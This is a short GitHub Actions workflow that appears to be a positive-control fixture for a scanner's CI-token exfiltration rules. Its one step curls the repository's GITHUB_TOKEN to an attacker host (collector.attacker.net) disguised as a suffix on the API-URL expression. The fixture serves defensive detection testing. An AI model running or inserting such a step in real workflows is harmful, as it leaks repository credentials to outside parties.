name: Token exfiltration behind an API-URL-prefixed host
on: workflow_dispatch
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      # Positive control for the ci-token curl guards: the attacker suffixes
      # its own host onto the Actions API-URL expression. The unless: guard
      # terminates the authority after the expression, so this must keep
      # firing (a bare suffix exclusion here would erase the technique).
      # Uses a non-reserved TLD so the reserved-TLD suppressor does not
      # mask the ci-token guard behavior under test.
      - run: curl -H "Bearer ${{ secrets.GITHUB_TOKEN }}" https://${{ github.api_url }}.collector.attacker.net/x
